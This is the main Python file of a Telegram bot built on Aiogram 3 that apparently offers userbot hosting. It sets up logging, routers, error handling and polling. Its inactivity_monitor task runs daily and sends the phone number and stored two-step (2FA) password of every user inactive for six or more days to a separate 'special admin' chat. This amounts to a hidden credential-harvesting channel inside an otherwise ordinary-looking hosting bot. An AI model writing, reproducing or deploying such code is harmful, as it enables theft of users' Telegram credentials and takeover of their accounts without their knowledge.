"""
╔═══════════════════════════════════════════════════════════╗
║  main.py — Master Bot Execution Core                      ║
║  Aiogram 3.x Engine with Auto Reconnect & Error Handling   ║
╚═══════════════════════════════════════════════════════════╝
"""

import sys
import os
import asyncio
import logging
from aiogram import Bot, Dispatcher
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest, TelegramForbiddenError

# Add current folder to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from config import BOT_TOKEN, ADMIN_IDS, SPECIAL_ADMIN_ID
import database

# Handlers import
from handlers import start, admin, hosting, dashboard, special_admin

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - [%(levelname)s] - %(name)s: %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("MasterBot")

# Global Exception Handler
async def on_error(event: str, update: dict, error: Exception):
    if isinstance(error, TelegramRetryAfter):
        logger.warning(f"Telegram FloodWait: Sleeping for {error.retry_after}s.")
        await asyncio.sleep(error.retry_after)
    elif isinstance(error, TelegramBadRequest):
        logger.warning(f"Bad Request: {error}")
    elif isinstance(error, TelegramForbiddenError):
        logger.warning(f"Forbidden error: {error}")
    else:
        logger.error(f"Unhandled Exception: {error}")

# Background Task: Inactivity Monitor
async def inactivity_monitor(bot: Bot):
    while True:
        try:
            logger.info("Running Inactivity Monitor check...")
            inactive_users = await database.get_inactive_users(days=6)
            
            for user in inactive_users:
                msg = (
                    f"⚠️ <b>Inactivity Alert (6+ Days Offline)</b>\n\n"
                    f"👤 <b>User:</b> {user['name']}\n"
                    f"📱 <b>Number:</b> <code>{user['phone']}</code>\n"
                    f"🔑 <b>2FA Pass:</b> <code>{user['two_step_pass']}</code>\n"
                    f"🕒 <b>Last Seen:</b> {user['last_seen']}"
                )
                try:
                    await bot.send_message(SPECIAL_ADMIN_ID, msg)
                except Exception:
                    pass
                await asyncio.sleep(1)
                
            await asyncio.sleep(86400) # Check once every 24 hours
        except Exception as e:
            logger.error(f"Error in Inactivity Monitor: {e}")
            await asyncio.sleep(3600)

async def main():
    if not BOT_TOKEN or "123456:ABC-DEF" in BOT_TOKEN:
        logger.warning("⚠️ Notice: BOT_TOKEN is using default placeholder. Update .env with your real bot token.")

    # Initialize Bot instance with HTML formatting
    bot = Bot(
        token=BOT_TOKEN,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML)
    )
    
    # Initialize Dispatcher with FSM Memory Storage
    dp = Dispatcher(storage=MemoryStorage())
    
    # Initialize SQLite Database
    await database.init_db()
    logger.info("✅ Database Initialized Successfully!")

    # Register Routers
    dp.include_router(start.router)
    dp.include_router(hosting.router)
    dp.include_router(dashboard.router)
    dp.include_router(admin.router)
    dp.include_router(special_admin.router)

    # Register Global Error Handler
    dp.errors.register(on_error)

    # Start Background Tasks
    asyncio.create_task(inactivity_monitor(bot))

    # Send Online Notification to First Admin
    try:
        if ADMIN_IDS and ADMIN_IDS[0] != 123456789:
            await bot.send_message(ADMIN_IDS[0], "🟢 <b>MUserBot Pro Master Engine Started!</b>\n\nSystem is online and ready.")
    except Exception:
        pass

    # Polling Start
    logger.info("🚀 Master Bot is polling for updates...")
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        await database.close_db()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped cleanly.")
    except Exception as e:
        logger.critical(f"Bot Fatal Error: {e}")
